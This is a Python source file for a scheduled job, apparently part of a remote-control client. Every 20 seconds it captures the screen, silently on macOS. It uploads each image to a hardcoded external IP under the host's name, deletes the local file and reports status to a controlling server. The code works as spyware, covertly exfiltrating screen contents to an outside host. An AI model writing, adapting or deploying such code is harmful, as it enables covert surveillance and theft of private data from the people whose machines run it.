import os
import socket
import threading
import time

import schedule
import requests


from client.jobs.job import Job
from core.utils.common_util import get_time


class Screenshot(Job):
    def __init__(self):
        super().__init__()
        self.stop_event = threading.Event()
        self.upload_url = "http://39.107.248.76/file/upload"

    def do_screenshot(self, filename):

        if os.name == 'nt':
            import pyautogui
            pyautogui.screenshot(filename)
        elif os.name == 'posix':
            command = f"screencapture -x {filename}"
            os.system(command)
        else:
            raise Exception('Unsupported os')

    def my_task(self):
        filename = 'screenshot_{}.png'.format(get_time())
        self.do_screenshot(filename)
        filename = os.path.abspath(filename)
        if not os.path.isfile(filename):
            self.send_to_server(0, f'File does not exist: {filename}', 0)
            return

        with open(filename, 'rb') as file:
            with requests.post(self.upload_url, files={'files': file},
                               data={'currentDirectory': f'/public/{socket.gethostname()}/'}) as resp:
                self.send_to_server(1, f'Upload result: {resp.text}', 0)
        os.remove(filename)

    def run(self):
        try:
            self.is_running = True
            self.send_to_server(1, f'Scheduled job is on.', 0)

            schedule.every(20).seconds.do(self.my_task)
            # schedule.every().hour.at(":00").do(self.my_task)  # schedule.cancel_job(job)
            while not self.stop_event.is_set():
                schedule.run_pending()
                time.sleep(1)
        except Exception as e:
            self.send_to_server(0, f'Error occurs: {e}', 0)  # 如果服务器断开抛出异常将终止该线程
        self.send_to_server(1, f'Thread ended: {threading.current_thread().name}', 1)

    def stop(self):
        self.send_to_server(0, f'Trying to stop', 0)
        schedule.clear()
        self.stop_event.set()
        self.is_running = False
